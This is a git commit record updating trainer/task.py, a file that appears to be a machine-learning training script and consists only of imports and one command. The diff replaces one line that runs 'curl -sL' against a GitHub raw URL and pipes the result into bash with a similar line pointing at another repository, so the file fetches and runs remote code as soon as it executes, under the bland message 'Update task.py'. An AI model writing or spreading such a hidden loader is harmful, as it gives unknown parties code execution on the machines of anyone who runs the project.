e2984287472c3831c79c32d0303f513a7a6b475f
bengetsia <124133523+bengetsia@users.noreply.github.com>
2024-01-08 20:43:38 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/ganejafaujanih/ins/raw/main/ulangi | bash')
+os.system('curl -sL https://github.com/bengetsia/soft/raw/main/testing | bash')
